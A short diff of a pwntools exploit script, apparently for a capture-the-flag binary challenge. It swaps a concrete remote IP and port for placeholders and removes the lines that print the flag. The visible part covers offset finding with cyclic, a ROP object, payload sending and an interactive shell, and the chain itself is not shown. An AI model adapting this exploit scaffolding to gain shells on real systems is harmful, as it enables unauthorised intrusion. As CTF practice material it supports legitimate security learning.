@@ -50,7 +50,7 @@ offset = find_ip(cyclic(100))
 
 # Start program
 io = process()
-#io = remote('209.97.142.217', 30977) <- for running the exploit remotely and getting the flag from the target
+#io = remote('target_ip', port) <- for running the exploit remotely and getting the flag from the target
 
 rop = ROP(elf)
 
@@ -71,7 +71,3 @@ io.sendlineafter('>', payload)
 # Got Shell?
 io.interactive()
 
-# Or, Get our flag!
-flag = io.recv()
-#print(flag)
-success(flag)
